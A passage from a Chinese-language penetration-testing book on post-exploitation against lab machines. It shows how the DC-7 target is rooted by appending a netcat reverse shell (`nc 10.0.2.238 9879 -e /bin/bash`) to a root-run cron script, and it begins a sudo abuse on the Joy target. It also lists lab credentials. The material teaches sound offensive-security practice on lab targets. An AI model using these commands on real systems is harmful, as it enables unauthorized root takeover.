  trans: "\n\n下一章将重点关注如何提升我们已获得的用户访问权限，以获取目标主机上的管理权限。\n\n# 问题\n\n1. 使用哪个命令启动 Metasploit\
    \ 框架？\n2. 在 Metasploit 内部使用哪个命令显示模块配置？\n3. 我们使用哪个 Linux 命令创建了利用 Mumbai:1 目标时使用的\
    \ FIFO 文件？\n\n# 第 9 章\n\n## 后渗透利用 (Post Exploitation)\n\n在上一章节中，我们涵盖了目标系统利用的主题，并学习了如何使用适用于渗透测试利用阶段的各种工具和技术，以获取目标系统上的初始层级访问。\n\
    \n本章将深入探讨后渗透利用主题以及在该阶段执行的活动。我们将利用在目标系统上获得的初始访问以及在之前的章节中获得的相关信息，通过获取管理权限来完全接管目标系统。\n\
    \n# 结构\n\n在本章中，我们将涉及以下主题：\n\n* 攻击管理员定时计划任务。\n* 攻击特权脚本和二进制文件。\n* 使用自动化脚本进行扫描。\n\
    * 漏洞利用内核或特权服务。\n\n我们还将遵循以下目标：\n\n# 目标\n\n阅读本章后，你将能够：\n\n* 执行手动和自动扫描以识别潜在的权限提升点。\n\
    * 使用 `netcat` 在 Kali 和目标主机之间传输文件。\n* 利用 SUID SGID 二进制文件。\n* 利用内核或系统进程提升访问权限。\n\
    * 破解密码哈希。\n* 执行逃逸序列以获取 shell。\n* 所以，让我们开始下一步吧。\n\n# DC-7\n\n在上一章节中，我们已经在目标主机上上传了一个\
    \ PHP 反向 shell，并以 `www-data` 用户的权限获取了 DC-7 目标的初始访问。\n\n接下来，我们打开了上一章在端口 9876 上收到的\
    \ Drupal/PHP 反向 shell，我们将利用这个 shell 渗透系统以获取特权访问。\n\n你可能还记得在[第 7 章，漏洞研究]中，`backups.sh`\
    \ 文件的组被设置为 `www-data`。\n\n![](img/Figure-9.1.jpg)\n\n**图 9.1：** `backups.sh` 文件权限\n\
    \n现在检查文件权限，我们可以确认 `www-data` 组对 `backups.sh` 文件具有读取、写入和执行权限。\n\n你可能还记得[第 7 章，漏洞研究]中，`backups.sh`\
    \ 脚本由 cron 守护进程执行，使用 root 权限执行备份任务。\n\n我们已经对 `backups.sh` 文件具有写入权限，因此获取 root 的最简单方法就是向\
    \ `backups.sh` 文件中添加一个反向 shell 条目，并等待 cron 守护进程以 root 身份执行它。\n\n在另一个 Kali 终端窗口中，设置一个\
    \ `netcat` 监听器监听端口 9879 以接收 root shell。\n\n![](img/Figure-9.2.jpg)\n\n**图 9.2：**\
    \ 设置 `netcat` 监听器\n\n回到包含 Drupal/PHP 反向 shell 的窗口，将有效负载追加到 `/opt/scripts/backups.sh`\
    \ 文件。\n\n1. 使用 `cd` 命令进入 `/opt/scripts` 目录。\n2. 输入命令 `echo \"nc 10.0.2.238 9879\
    \ -e /bin/bash\" >> ./backups.sh`。\n\n![](img/Figure-9.3.jpg)\n\n**图 9.3：** 在\
    \ `backups.sh` 脚本内部添加 `netcat` 反向 shell 命令\n\n对 `backups.sh` 执行 `tail` 命令的输出显示有效负载已成功添加到文件中。我们现在做的只需等待\
    \ cron 守护进程执行 `backups.sh` 任务，并在我们的 `netcat` 监听端口 9879 上接收反向 shell。\n\n如果你设置正确，你应该会收到来自\
    \ DC7 目标的 root 权限连接。收到连接后，执行 `id` 命令并查看 root 用户主目录下的 `theflag.txt` 文件内容来确认权限。\n\
    \n![](img/Figure-9.4.jpg)\n\n**图 9.4：** 成功！！DC7 目标已获取 root\n\n做得！你已成功获取了 DC7 目标的管理权限。\n\
    \n记录下观察结果。\n\n**观察笔记：**\n\n**IP 地址：** 10.0.2.27\n**操作系统：** Linux (基于 Debian 10)\n\
    **开放端口与服务：**\n* 22/tcp - SSH\n    * OpenSSH 7.4p1 (从服务横幅获取)\n    * SSH 允许使用在 GitHub\
    \ 页面找到的凭据登录 `dc7user`。\n    * 脚本 `/opt/scripts/backup.sh` 用于备份网站和 sql 数据库。\n \
    \   * 定期运行 `backup.sh` 脚本。\n    * `Backup.sh` 脚本可以被 root 用户或 `www-data` 组的用户修改。\n\
    \        * 脚本追加了 `netcat` 反向 shell 有效负载以获取 root 权限。\n    * 正在使用 Drush 管理 Drupal\n\
    * 80/tcp - HTTP\n    * Apache 2.4.25 (从服务横幅获取)\n        * 发现 `robots.txt`\n  \
    \      * Drupal 8 (从页面源码获取)\n        * 管理员密码更改为‘admin123’\n        * 上传并启用了 PHP\
    \ Filter 模块允许执行自定义 PHP 代码。\n        * 服务器上上传了 PHP 反向 shell。\n            * ![](img/ent.jpg)\
    \ 以 `www-data` 用户的权限建立了反向连接。\n    * 主页上的账号 `@DC7user`\n        * 通过 Google 搜索该账号发现了\
    \ Twitter 和 Github 账户。\n        * 发现源码以及凭据 `dc7user` 和 ‘MdR3xOgB7#dW’\n* `/opt/scripts/backups.sh`\
    \ 属于 `www-data` 组的用户可写\n* 脚本追加了 `netcat` 反向 shell 有效负载以获取 root 权限。\n\n# Digitalworld.local:Joy\n\
    \n在上一章节中，我们利用 Joy 系统上的 proftpd 漏洞并使用 Metasploit 框架获取了 shell 访问，利用利用目标系统时发现的凭据进一步登录了用户\
    \ Patrick 的账户。\n\n在我们进一步探索系统之前，打开 Metasploit 反向 shell 并 `sudo` 进入 Patrick 的账户。\n\
    \n让我们先检查用户 Patrick 可以以管理员权限运行的命令列表。\n\n![](img/Figure-9.5.jpg)\n\n**图 9.5：** `sudo\
    \ -l` 命令输出\n\n`sudo -l` 命令的输出显示 patrick 可以以 root 身份运行 `/home/patrick/script/test`。让我们探索这个测试文件，看看能用它做什么。\n\
    \n![](img/Figure-9.6.jpg)\n\n**图 9.6：** 尝试查看文件内容时拒绝访问\n\n在此阶段，使用 `cd` 命令读取文件失败，并返回“权限拒绝”错误。让我们检查文件权限以确定原因。\n\
    \n![](img/Figure-9.7.jpg)\n\n**图 9.7：** 检查测试文件权限\n\n用户 patrick 没有权限进入脚本目录，甚至无法对文件进行目录列表。\n\
    \n无论如何，用户 Patrick 拥有足够的 sudo 权限以 root 身份执行 `/home/patrick/script/test` 文件，因此我们只需要深入研究并逐步解决问题。\n\
    \n![](img/Figure-9.8.jpg)\n\n**图 9.8：** 使用 `sudo` 执行测试脚本\n\n该脚本的目的是更改目录内文件的权限，让我们看看能否跳出目录限制来修改父目录的权限。\n\
    \n虽然你可以选择重写系统文件（如 `/etc/passwd` 或 `/etc/shadow`）的权限，但这种方法将是非常不便的，涉及对用户 patrick\
    \ 或 root 用户相关条目的修改。\n\n"
